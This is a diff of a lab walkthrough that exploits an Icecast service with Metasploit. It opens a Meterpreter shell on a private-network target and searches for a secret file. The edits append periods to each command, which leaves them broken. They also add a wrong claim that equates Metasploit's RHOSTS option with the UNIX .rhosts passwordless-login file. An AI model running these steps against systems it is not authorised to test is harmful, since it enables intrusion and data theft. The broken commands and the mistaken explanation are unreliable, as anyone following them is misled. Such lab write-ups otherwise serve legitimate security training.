@@ -63,10 +63,12 @@ Now we’ll use a tool called SearchSploit to locally store a library of exploit
 
 
 3. Start Metasploit and search for the Icecast module and load it for use.:
+ 
     msfconsole.
     search icecast.
     use 0.
 
+MSFconsole provides a command line interface to access and work with the Metasploit.
 The Metasploit is a computer security that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. 
 
     starting metasploit and searching icecast
@@ -78,8 +80,8 @@ The Metasploit is a computer security that provides information about security v
 
 4. Set the `RHOST` to the target machine and run.
 
-    set RHOSTS 192.168.0.20
-    run
+    set RHOSTS 192.168.0.20.
+    run.
 
  Rhosts allows me to log in to a UNIX-based system from another computer on the same network.
  The rhosts file contains a list of hosts and user names that determines who can log in to a system remotely without a password
@@ -90,9 +92,11 @@ The Metasploit is a computer security that provides information about security v
 
 5. Search for the `secretfile.txt` on the target.
 
-    meterpreter > search -f *secret*
+    meterpreter > search -f *secret*.
 OR
-    meterpreter > shell
+    meterpreter > shell.
+
+Meterpreter allows me to remotely take over the compromised system, having control of the file system, collect sensitive information such as credentials and secret files.
     
     The search of the secret 
 ![The search of secret file](./Images/snap-5.PNG)
